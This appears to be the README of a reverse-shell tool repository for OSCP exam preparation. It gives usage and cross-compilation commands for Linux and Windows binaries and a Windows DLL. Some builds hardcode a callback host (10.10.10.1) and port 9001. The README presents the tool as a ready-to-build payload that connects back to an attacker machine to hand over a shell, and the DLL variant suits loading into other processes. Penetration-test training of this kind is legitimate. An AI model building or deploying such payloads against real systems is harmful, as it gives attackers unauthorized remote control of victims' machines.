# Simple Reverse Shell

Simple reverse shell for linux and windows for OSCP preparation


Usage

```
rev.exe <ip> <port>
```

---
### For Linux

Compilation with arguments
```
gcc -static -o rev simpleRevShell.c
gcc -static -m32 -o rev32 simpleRevShell.c
```

Hardcoded IP and PORT
```
gcc -static -o revIp simpleRevShellIp.c -DLHOST='"10.10.10.1"' -DLPORT=9001
gcc -static -m32 -o revIp32 simpleRevShellIp.c -DLHOST='"10.10.10.1"' -DLPORT=9001
```

---
### For Windows

Compilation with arguments
```
x86_64-w64-mingw32-g++ -static -o rev simpleRevShellWin.c -lws2_32
i686-w64-mingw32-g++ -static -o rev32 simpleRevShellWin.c -lws2_32
```

Hardcoded IP and PORT
```
x86_64-w64-mingw32-g++ -static -o revIp simpleRevShellWinIP.c -lws2_32 -DLHOST='"10.10.10.1"' -DLPORT=9001
i686-w64-mingw32-g++ -static -o revIp32 simpleRevShellWinIP.c -lws2_32 -DLHOST='"10.10.10.1"' -DLPORT=9001
```

Hardcoded Ip and PORT for DLL
```
x86_64-w64-mingw32-gcc -static simpleRevShellWinDll.cpp --shared -o rev.dll -lws2_32 -DLHOST='"10.10.10.1"' -DLPORT=9001
i686-w64-mingw32-gcc -static simpleRevShellWinDll.cpp --shared -o rev32.dll -lws2_32 -DLHOST='"10.10.10.1"' -DLPORT=9001
```